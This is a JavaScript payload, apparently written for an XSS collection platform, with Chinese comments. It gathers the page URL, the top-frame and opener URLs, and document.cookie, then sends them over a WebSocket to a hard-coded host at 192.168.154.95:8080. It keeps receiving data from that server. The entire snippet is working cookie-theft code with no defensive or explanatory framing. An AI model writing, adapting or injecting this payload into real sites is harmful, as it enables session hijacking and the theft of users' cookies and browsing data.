
(function () {
    var  src = 'project_id=1&id=a1cS&location=' + encodeURIComponent((function () {
        try {
            return document.location.href
        } catch (e) {
            return ''
        }
    })()) + '&toplocation=' + encodeURIComponent((function () {
        try {
            return top.location.href
        } catch (e) {
            return ''
        }
    })()) + '&cookie=' + encodeURIComponent((function () {
        try {
            return document.cookie
        } catch (e) {
            return ''
        }
    })()) + '&opener=' + encodeURIComponent((function () {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
        } catch (e) {
            return ''
        }
    })());

    var ws = new WebSocket('ws://192.168.154.95:8080/test');
    // 建立 web socket 连接成功触发事件
    ws.onopen = function () {
        ws.send(src);
    }
    //接收到消息的回调方法
    ws.onmessage = function (event) {
        // alert('数据回来了额' + event.data)
        console.log(event.data);//后台不间断发送数据，持续接收。
    }
    //断开 web socket 连接成功触发事件
    ws.onclose = function () {
        alert("连接已关闭...");
    };

})();
